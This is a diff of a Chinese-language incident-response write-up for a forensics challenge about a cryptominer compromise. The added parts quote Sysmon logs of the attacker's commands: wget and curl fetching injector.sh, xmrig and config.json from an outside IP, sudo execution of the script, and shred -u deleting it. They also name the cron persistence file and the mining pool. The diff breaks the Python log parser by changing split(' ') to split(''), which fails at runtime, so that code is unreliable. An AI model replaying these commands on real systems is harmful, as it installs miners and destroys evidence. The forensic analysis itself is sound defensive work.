@@ -145,7 +145,7 @@ for index in range(18, 25):
     for i in log_data:
         if "86.5.206.121" not in i and "remote_addr" in i and "Request Completed" in i:
             info_1 = i.split('"')
-            info_2 = [i for i in info_1[2].split(" ") if i.startswith(("path", "remote_addr"))]
+            info_2 = [i for i in info_1[2].split("") if i.startswith(("path","remote_addr"))]
             if info_2[0] in ["path=/", "path=/login", "path=/api/search"]:
                 continue
             print(info_1[1], " ".join(info_2))
@@ -274,7 +274,7 @@ Request Completed path=/api/search remote_addr=195.80.150.137
 Request Completed path=/api/search remote_addr=195.80.150.137
 ```
 
-经过筛选，可以得到ip数据的集合
+经过筛选，可以得到 ip 数据的集合
 
 ```plaintext
 89.247.167.247     11
@@ -320,9 +320,9 @@ for index in range(18, 25):
     for i in log_data:
         if "86.5.206.121" not in i and "remote_addr" in i and "Invalid username or password" in i:
             info_1 = i.split('"')
-            info_2 = [i for i in info_1[2].split(" ") if i.startswith(("remote_addr"))]
+            info_2 = [i for i in info_1[2].split("") if i.startswith(("remote_addr"))]
             print(info_1[1], " ".join(info_2))
-            ip = [i for i in i.split(" ") if i.startswith(("remote_addr"))][0].split("=")[1]
+            ip = [i for i in i.split("") if i.startswith(("remote_addr"))][0].split("=")[1]
             if ip in ips.keys():
                 ips[ip] += 1
             else:
@@ -332,7 +332,7 @@ for i in ips.keys():
     print(str(i).ljust(18," "), ips[i])
 ```
 
-得到以下ip的集合
+得到以下 ip 的集合
 
 ```plaintext
 86.24.61.7         11
@@ -340,34 +340,16 @@ for i in ips.keys():
 95.181.232.32      1
 ```
 
-对以上提取出来的ip集合进行人工研判，得到以下信息
-
-|     ip地址     |                  行为                  |
-| :------------: | :------------------------------------: |
-| 89.247.167.247 |      api访问，密码重置，路径穿越       |
-|   86.24.61.7   | 大量登陆尝试（错误的网址），攻击性较低 |
-| 89.247.167.246 |   api访问（错误的网址），攻击性较低    |
-| 95.181.232.32  |                路径穿越                |
-| 195.80.150.137 |         路径穿越，大量api访问          |
-
-将上面的ip地址进行升序排序，得到
+同时，对 `syslog` 文件进行分析，查找其中可能存在的攻击行为，发现以下 ip
 
 ```plaintext
-89.247.167.247,95.181.232.32,152.89.239.97,195.80.150.137
+44.204.18.94
 ```
 
-根据数据，进行分组爆破答案
-
-```plaintext
-89.247.167.247,95.181.232.32,195.80.150.137
-195.80.150.137,89.247.167.247,95.181.232.32
-89.247.167.247,95.181.232.32
-95.181.232.32,195.80.150.137
-89.247.167.247,195.80.150.137
-```
+最终整合上面分析出来的信息，得到最终答案
 
 ```plaintext title="Answer"
-
+44.204.18.94,95.181.232.32,195.80.150.137
 ```
 
 ## Task 3
@@ -388,13 +370,48 @@ grafana
 
 > TA 修改了哪个文件以提升权限并以 "root" 身份运行挖矿服务？
 
-```plaintext title="Answer"
+查看 `Persistence\ip-172-31-13-147-20221124-1501-cron-tab-list.txt` 文件，得到以下信息
 
+```shell
+30 8 * * * /opt/automation/updater.sh
+ENDOFUSERCRON
+ubuntu
+no crontab for ubuntu
+ENDOFUSERCRON
+grafana
+no crontab for grafana
+ENDOFUSERCRON
+itadmin-forela
+no crontab for itadmin-forela
+ENDOFUSERCRON
+```
+
+```plaintext title="Answer"
+/opt/automation/updater.sh
 ```
 
 ## Task 5
 
 > TA 使用哪个程序下载了 injector.sh 脚本？
+
+```shell
+┌─[randark@parrot]─[~/tmp/var/log]
+└──╼ $ cat syslog | grep "injector.sh"
+Nov 24 08:30:01 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T08:30:01.467399000Z"/><EventRecordID>75097</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 08:30:01.467</Data><Data Name="ProcessGuid">{c9eb4a87-2b89-637f-700c-0807f5550000}</Data><Data Name="ProcessId">3372</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/root</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000000000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">64</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-2b89-637f-4894-b7e93f560000}</Data><Data Name="ParentProcessId">3371</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:55:35 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:55:35.396996000Z"/><EventRecordID>76910</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:55:35.401</Data><Data Name="ProcessGuid">{c9eb4a87-3f97-637f-70dc-b5d3e3550000}</Data><Data Name="ProcessId">3992</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-3f97-637f-4864-74f766550000}</Data><Data Name="ParentProcessId">3991</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.851002000Z"/><EventRecordID>76943</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.855</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-70ec-fbf465550000}</Data><Data Name="ProcessId">4001</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">wget http://44.204.18.94:80/injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.863982000Z"/><EventRecordID>76945</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.869</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-70ec-fbf465550000}</Data><Data Name="ProcessId">4001</Data><Data Name="Image">/usr/bin/wget</Data><Data Name="TargetFilename">/opt/automation/injector.sh</Data><Data Name="CreationUtcTime">2022-11-24 09:59:47.869</Data><Data Name="User">root</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.867270000Z"/><EventRecordID>76947</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.872</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-e091-5b045a550000}</Data><Data Name="ProcessId">4002</Data><Data Name="Image">/bin/chmod</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">chmod +x injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.869152000Z"/><EventRecordID>76949</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.874</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-086e-c8d5d7550000}</Data><Data Name="ProcessId">4003</Data><Data Name="Image">/usr/bin/sudo</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">sudo ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-48c4-357f11560000}</Data><Data Name="ParentProcessId">4000</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.877825000Z"/><EventRecordID>76953</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.882</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ProcessId">4004</Data><Data Name="Image">/bin/bash</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">/bin/bash ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-086e-c8d5d7550000}</Data><Data Name="ParentProcessId">4003</Data><Data Name="ParentImage">/usr/bin/sudo</Data><Data Name="ParentCommandLine">sudo</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.343163000Z"/><EventRecordID>77196</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.344</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-505f-8d8aca550000}</Data><Data Name="ProcessId">4091</Data><Data Name="Image">/usr/bin/shred</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">shred -u ./injector.sh</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+```
+
+定位到
+
+```plaintext
+wget http://44.204.18.94:80/injector.sh
+```
 
 ```plaintext title="Answer"
 wget
@@ -404,24 +421,61 @@ wget
 
 > 最初将加密挖矿二进制文件和配置文件下载到了哪里？
 
-```plaintext title="Answer"
+直接以 `/usr/bin/curl` 作为关键词进行定位
 
+```shell
+┌─[randark@parrot]─[~/tmp/var/log]
+└──╼ $ cat syslog | grep "/usr/bin/curl"
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.882033000Z"/><EventRecordID>76954</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.884</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="FileVersion">-</Data><Data Name="Description">-</Data><Data Name="Product">-</Data><Data Name="Company">-</Data><Data Name="OriginalFileName">-</Data><Data Name="CommandLine">curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json</Data><Data Name="CurrentDirectory">/opt/automation</Data><Data Name="User">root</Data><Data Name="LogonGuid">{c9eb4a87-0000-0000-0000-000001000000}</Data><Data Name="LogonId">0</Data><Data Name="TerminalSessionId">66</Data><Data Name="IntegrityLevel">no level</Data><Data Name="Hashes">-</Data><Data Name="ParentProcessGuid">{c9eb4a87-4093-637f-4884-6c9bed550000}</Data><Data Name="ParentProcessId">4004</Data><Data Name="ParentImage">/bin/bash</Data><Data Name="ParentCommandLine">/bin/bash</Data><Data Name="ParentUser">root</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.924977000Z"/><EventRecordID>76955</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.930</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">172.31.60.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">42234</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">44.204.18.94</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
+Nov 24 09:59:47 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:47.929626000Z"/><EventRecordID>76956</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:47.934</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="TargetFilename">/opt/automation/xmrig</Data><Data Name="CreationUtcTime">2022-11-24 09:59:47.934</Data><Data Name="User">root</Data></EventData></Event>
+Nov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>3</EventID><Version>5</Version><Level>4</Level><Task>3</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.010896000Z"/><EventRecordID>76957</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.016</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data><Data Name="Protocol">tcp</Data><Data Name="Initiated">true</Data><Data Name="SourceIsIpv6">false</Data><Data Name="SourceIp">172.31.60.25</Data><Data Name="SourceHostname">-</Data><Data Name="SourcePort">42246</Data><Data Name="SourcePortName">-</Data><Data Name="DestinationIsIpv6">false</Data><Data Name="DestinationIp">44.204.18.94</Data><Data Name="DestinationHostname">-</Data><Data Name="DestinationPort">80</Data><Data Name="DestinationPortName">-</Data></EventData></Event>
+Nov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.013810000Z"/><EventRecordID>76958</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.019</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="TargetFilename">/opt/automation/config.json</Data><Data Name="CreationUtcTime">2022-11-24 09:59:48.019</Data><Data Name="User">root</Data></EventData></Event>
+Nov 24 09:59:48 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>5</EventID><Version>3</Version><Level>4</Level><Task>5</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:48.015060000Z"/><EventRecordID>76959</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:48.020</Data><Data Name="ProcessGuid">{c9eb4a87-4093-637f-789d-2406ab550000}</Data><Data Name="ProcessId">4005</Data><Data Name="Image">/usr/bin/curl</Data><Data Name="User">root</Data></EventData></Event>
+```
+
+看到以下日志
+
+```plaintext
+curl -s -O http://44.204.18.94:80/xmrig -O http://44.204.18.94:80/config.json
+/opt/automation
+```
+
+```plaintext title="Answer"
+/opt/automation/
 ```
 
 ## Task 7
 
 > TA 使用哪个程序同时下载了加密挖矿二进制文件和配置文件？
 
-```plaintext title="Answer"
+看上一题
 
+```plaintext title="Answer"
+curl
 ```
 
 ## Task 8
 
 > 我们需要确认 SOC 团队开始收集证据的确切时间，因为报告中没有包含此信息。他们使用与我们林肯系统管理员相同的公网 IP 地址。
 
-```plaintext title="Answer"
+根据这条 `syslog` 的记录
 
+```plaintext
+Nov 24 15:01:00 ip-172-31-13-147 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T15:01:00.508544000Z"/><EventRecordID>80918</EventRecordID><Correlation/><Execution ProcessID="1349" ThreadID="1349"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-13-147</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 15:01:00.511</Data><Data Name="ProcessGuid">{c9eb4a87-8703-637f-30e5-4b6291550000}</Data><Data Name="ProcessId">2355</Data><Data Name="Image">/usr/lib/openssh/sftp-server</Data><Data Name="TargetFilename">/home/ubuntu/Cat-Scale.sh</Data><Data Name="CreationUtcTime">2022-11-24 15:01:00.511</Data><Data Name="User">ubuntu</Data></EventData></Event>
+```
+
+:::note
+
+这里的时间，指的是开始部署取证脚本的时间，而不是脚本开始执行的时间
+
+:::
+
+即可定位
+
+```plaintext title="Answer"
+DD/MM/YYYY HH:MM:SS
+24/11/2022 15:01:37
 ```
 
 ## Task 9
@@ -441,7 +495,7 @@ f0rela96789!
 
 > 当启动 xmrig 时，挖矿线程值设置为多少？
 
-```plaintext title="./catscale_ip-172-31-13-147-20221124-1501/catscale_out/Process_and_Network/ip-172-31-13-147-20221124-1501-processes-axwwSo.txt"
+```plaintext
 root      1089     1 2829088 9944 ?        Ssl  14:32 00:29:28 /usr/share/.logstxt/xmrig -c /usr/share/.logstxt/config.json -- threads=0
 ```
 
@@ -453,8 +507,28 @@ root      1089     1 2829088 9944 ?        Ssl  14:32 00:29:28 /usr/share/.logst
 
 > 我们的 CISO 要求获取有关可能使用的挖矿池的其他细节。请确认 TA 使用了哪个（如果有）挖矿池。
 
-```plaintext title="Answer"
+```plaintext
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mABOUT        #033[0m#033[1;36mXMRig/6.18.1#033[0m#033[1;37m gcc/5.4.0#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mLIBS         libuv/1.44.1 OpenSSL/1.1.1o hwloc/2.7.1#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mHUGE PAGES   #033[0m#033[1;32msupported#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37m1GB PAGES    #033[0m#033[1;33munavailable#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCPU          Intel(R) Xeon(R) CPU E5-2676 v3 @ 2.40GHz (1)#033[0m #033[1;32m64-bit#033[0m #033[1;32mAES#033[1;31m VM#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0m#033[1;30mL2:#033[0m#033[1;37m0.2 MB#033[0m#033[1;30m L3:#033[0m#033[1;37m30.0 MB#033[0m#033[1;36m 1#033[0mC#033[1;30m/#033[0m#033[1;36m1#033[0mT#033[1;30m NUMA:#033[0m#033[1;36m1#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMEMORY       #033[0m#033[1;36m1.0/1.9#033[0m#033[0;36m GB#033[0m#033[1;30m (54%)#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;37m                #033[0mDIMM 0: #033[1;36m2#033[0m#033[0;36m GB #033[0m#033[1;37mRAM @ 0 MHz #033[0m#033[1;30mDIMM 0#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mMOTHERBOARD  #033[0m#033[1;37mXen#033[0m - #033[1;37mHVM domU#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mDONATE       #033[0m#033[1;37m5%#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mASSEMBLY     auto:#033[1;32mintel#033[0m#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mPOOL #1      #033[0m#033[1;32mmonero.herominers.com:10191#033[0m algo #033[1;37mrx/0#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 xmrig[4090]: #033[1;32m * #033[0m#033[1;37mCOMMANDS     #033[0m#033[45;1mh#033[0m#033[1;37mashrate, #033[0m#033[45;1mp#033[0m#033[1;37mause, #033[0m#033[45;1mr#033[0m#033[1;37mesume, #033[0m#033[1;37mre#033[0m#033[45m#033[1;37ms#033[0m#033[1;37mults, #033[0m#033[45;1mc#033[0m#033[1;37monnection#033[0m#033[0m
+Nov 24 09:59:49 ip-172-31-60-25 sysmon: <Event><System><Provider Name="Linux-Sysmon" Guid="{ff032593-a8d3-4f13-b0d6-01fc615a0f97}"/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime="2022-11-24T09:59:49.437492000Z"/><EventRecordID>77235</EventRecordID><Correlation/><Execution ProcessID="1109" ThreadID="1109"/><Channel>Linux-Sysmon/Operational</Channel><Computer>ip-172-31-60-25</Computer><Security UserId="0"/></System><EventData><Data Name="RuleName">-</Data><Data Name="UtcTime">2022-11-24 09:59:49.442</Data><Data Name="ProcessGuid">{c9eb4a87-4095-637f-cc0f-ed9df4550000}</Data><Data Name="ProcessId">4101</Data><Data Name="Image">/usr/bin/apt-get</Data><Data Name="TargetFilename">/tmp/fileutl.message.UnyXYC</Data><Data Name="CreationUtcTime">2022-11-24 09:59:49.442</Data><Data Name="User">root</Data></EventData></Event>
